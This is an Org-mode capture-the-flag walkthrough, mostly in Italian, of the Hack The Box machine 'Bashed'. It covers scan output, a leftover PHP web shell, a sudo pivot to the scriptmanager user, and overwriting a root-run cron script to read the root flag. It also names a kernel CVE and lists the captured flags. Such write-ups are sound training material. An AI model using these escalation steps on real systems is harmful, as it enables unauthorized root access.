@@ -1,0 +1,253 @@
+#+TITLE: HTB - Bashed
+#+AUTHOR: Leonardo Tamiano
+#+HTML_HEAD_EXTRA: <style>pre { background-color: #000; color: #bbb; } </style>
+
+* Basic Info
+  :PROPERTIES:
+  :UNNUMBERED: t
+  :END:  
+  - *Default IP*: 10.10.10.68
+  - *Video*: [[https://www.youtube.com/watch?v=EVGgY-dtBkk][HTB - Bashed]]
+  - *Table of contents*:
+    #+TOC: headlines 2
+
+  ------------------------
+  
+  A seguire è riportato un breve walkthrough della macchina *Bashed*
+  offerta dalla piattaforma Hack the Box.
+
+* Enumeration
+** nmap
+*** nmap bashed
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 03:35 CET
+Nmap scan report for bashed (10.129.38.153)
+Host is up (0.052s latency).
+Other addresses for bashed (not scanned): 10.129.34.139
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
+    #+end_example
+
+*** nmap -sC -sV bashed
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 03:38 CET
+Nmap scan report for bashed (10.129.38.153)
+Host is up (0.051s latency).
+Other addresses for bashed (not scanned): 10.129.34.139
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
+    #+end_example
+
+*** nmap -p- bashed
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 03:43 CET
+Nmap scan report for bashed (10.129.38.153)
+Host is up (0.051s latency).
+Other addresses for bashed (not scanned): 10.129.34.139
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds    
+    #+end_example
+
+** dirsearch
+*** python3 dirsearch.py -r -u http://bashed -e php,txt
+    #+begin_example
+
+_|. _ _  _  _  _ _|_    v0.4.0
+(_||| _) (/_(_|| (_| )                             
+
+Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 7478 | Recursion level: 1
+
+Error Log: /home/leo/repos/dirsearch/logs/errors-20-11-08_03-53-28.log
+
+Target: http://bashed                               
+
+Output File: /home/leo/repos/dirsearch/reports/bashed/_20-11-08_03-53-28.txt
+
+[03:53:28] Starting:
+[03:53:28] 301 -  298B  - /php  ->  http://bashed/php/     (Added to queue)
+[03:53:30] 403 -  295B  - /.htaccess.bak1
+[03:53:30] 403 -  295B  - /.htaccess.orig
+[03:53:30] 403 -  297B  - /.htaccess.sample
+[03:53:30] 403 -  295B  - /.htaccess.save
+[03:53:30] 403 -  293B  - /.htaccessBAK             
+[03:53:30] 403 -  293B  - /.htaccessOLD             
+[03:53:30] 403 -  294B  - /.htaccessOLD2            
+[03:53:30] 403 -  285B  - /.htm                     
+[03:53:30] 403 -  286B  - /.html                    
+[03:53:30] 403 -  292B  - /.httr-oauth              
+[03:53:31] 403 -  285B  - /.php
+[03:53:31] 403 -  286B  - /.php3
+[03:53:40] 200 -    0B  - /config.php
+[03:53:41] 301 -  298B  - /css  ->  http://bashed/css/     (Added to queue)
+[03:53:41] 301 -  298B  - /dev  ->  http://bashed/dev/     (Added to queue)
+[03:53:41] 200 -   1KB  - /dev/                     
+[03:53:42] 301 -  300B  - /fonts  ->  http://bashed/fonts/     (Added to queue)
+[03:53:43] 301 -  301B  - /images  ->  http://bashed/images/     (Added to queue)
+[03:53:43] 200 -   2KB  - /images/
+[03:53:43] 200 -   8KB  - /index.html
+[03:53:43] 301 -  297B  - /js  ->  http://bashed/js/     (Added to queue)
+[03:53:46] 200 -  934B  - /php/
+[03:53:48] 403 -  294B  - /server-status
+[03:53:48] 403 -  295B  - /server-status/     (Added to queue)
+[03:53:49] 301 -  302B  - /uploads  ->  http://bashed/uploads/     (Added to queue)
+[03:53:49] 200 -   14B  - /uploads/
+    #+end_example
+
+** priv esc
+*** www
+**** user flag
+     #+begin_src sh
+cat /home/arrexel/user.txt  
+     #+end_src
+
+**** sudo -l
+     #+BEGIN_EXAMPLE
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+     #+END_EXAMPLE
+
+     Può essere exploitata con
+
+     #+BEGIN_SRC sh
+sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'             
+     #+END_SRC
+
+     @@html: <hr style="border: 1px solid #A1283B;" />@@
+
+*** scriptmanager
+**** root flag
+     #+begin_src sh
+echo "import os; os.system('cp /root/root.txt /dev/shm/.logic.txt && chmod 777 /dev/shm/.logic.txt')" > /scripts/test.sh  
+     #+end_src
+
+* Walkthrough
+** Primi scans
+   Facendo i soliti scan con ~nmap~ otteniamo la seguente situazione
+
+   *nmap -p- bashed*
+  
+   #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 03:35 CET
+Nmap scan report for bashed (10.129.38.153)
+Host is up (0.052s latency).
+Other addresses for bashed (not scanned): 10.129.34.139
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
+   #+end_example
+
+   Come possiamo vedere, abbiamo un web server che ascolta sulla porta
+   $80$.
+
+** Web shell nel server
+   Andando col browser vediamo una pagina abbastanza tranquilla. Se
+   però andiamo nella risorsa ~/dev/~ del web server, ovvero all'url
+   http://bashed/dev, troviamo una webshell scritta in php nominata
+   ~phpbash.php~.
+
+   Utilizzando questa shell siamo in grado di spawnare una reverse
+   shell ed entrare nella macchina.
+
+** User flag
+   Una volta entrati come l'utente ~www-data~ possiamo prendere
+   immediatamente la user flag andando nella home directory dell'utente
+   ~arrexel~ ed eseguendo il seguente comando
+
+   #+begin_src sh
+cat /home/arrexel/user.txt  
+   #+end_src
+
+** Passare a scriptmanager
+   Eseguendo il comando ~sudo -l~ otteniamo il seguente output
+
+   #+begin_example
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+   #+end_example
+
+   come possiamo vedere, possiamo eseguire qualsiasi comando come
+   l'utente ~scriptmanager~ tramite l'utility ~sudo~. In particolare
+   quindi siamo in grado di passare dall'utente ~www-data~ all'utente
+   ~scriptmanager~ tramite il seguente comando
+
+   #+begin_src sh
+sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'             
+   #+end_src
+
+** Root flag
+   Una volta passati all'utente scriptmanager, possiamo utilizzare il
+   tool ~pspy64s~ per vedere che c'è un cronjob che esegue ogni tot
+   tempo lo script presente in ~/scripts/test.sh~.
+
+   In particolare possiamo inserire il seguente codice
+
+   #+begin_src sh
+echo "import os; os.system('cp /root/root.txt /dev/shm/.logic.txt && chmod 777 /dev/shm/.logic.txt')" > /scripts/test.sh  
+   #+end_src
+
+   in modo da copiare la root flag nel fil ~/dev/shm/.logic.txt~ la
+   prossima volta che lo script viene eseguito dal cronjob.
+   
+* Original Walkthrough                                             :noexport:
+  In ~/dev~ there are a couple of php browser shell leftovers such as
+  ~/dev/phpbash.php~. Like this we get a reverse shell we can use a
+  simple php script.
+  
+  Once inside we can immediately get the user flag with
+  
+  #+begin_src sh
+cat /home/arrexel/user.txt  
+  #+end_src
+
+  Now note that with ~sudo -l~ we can execute all types of commands as
+  ~scriptmanager~.
+    
+  Note also that the python executables situated in the ~/scripts~
+  folder are executed, as ~root~, every once in a while. There's
+  probably a cronbjo for that. To exploit this we need to change into
+  ~scriptmanager~ account, which can be done with
+  
+  #+begin_src sh
+sudo -u scriptmanager python -c 'import pty;pty.spawn("/bin/bash")'
+  #+end_src
+    
+  Then, once we are ~scriptmanager~, we can execute the following
+  command
+    
+  #+begin_src sh
+echo "import os; os.system('cp /root/root.txt /dev/shm/.logic.txt && chmod 777 /dev/shm/.logic.txt')" > /scripts/test.sh  
+  #+end_src
+    
+  and the next time the scripts in ~/scripts~ are executed we can read
+  the root flag ~/dev/shm/.logic.txt~.
+
+** Using CVE-2017-16995
+   A different way to get root access is by using [[https://www.exploit-db.com/exploits/44298/][CVE
+   2017-16995]]. Simply compile it on local machine, send it on target
+   machine and execute it.
+
+* Flags                                                            :noexport:
+  - *user*: 2c281f318555dbc1b856957c7147bfc1
+  - *root*: cc4f0afe3a1026d402ba10329674a8e2
